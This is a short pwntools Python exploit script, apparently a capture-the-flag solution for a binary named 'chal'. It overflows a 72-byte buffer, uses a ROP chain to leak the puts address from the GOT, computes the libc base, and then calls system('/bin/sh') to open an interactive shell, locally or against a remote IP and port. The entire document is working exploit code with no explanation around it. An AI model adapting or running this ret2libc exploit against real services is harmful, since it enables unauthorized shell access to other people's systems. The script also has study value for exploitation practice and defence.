#!/usr/bin/env python3
from pwn import *
import sys

FILENAME = "chal"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
exe = context.binary = ELF(FILENAME)
libc = ELF("libc.so.6")

if len(sys.argv) == 1:
    r = process(FILENAME)
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)

rop = ROP(exe)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret = rop.find_gadget(["ret"]).address

payload = b"A" * 72
payload += p64(pop_rdi) + p64(exe.got["puts"])
payload += p64(exe.plt["puts"])
payload += p64(exe.symbols["chal"])

r.recvuntil(b"Input your data: ")
r.send(payload)

leak = u64(r.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.symbols["puts"]
system = libc.symbols["system"]
binsh = next(libc.search(b"/bin/sh\x00"))

log.info("puts leak: " + hex(leak))
log.info("libc base: " + hex(libc.address))
log.info("system: " + hex(system))
log.info("/bin/sh: " + hex(binsh))

payload = b"A" * 72
payload += p64(ret)
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

r.recvuntil(b"Input your data: ")
r.send(payload)

r.interactive()
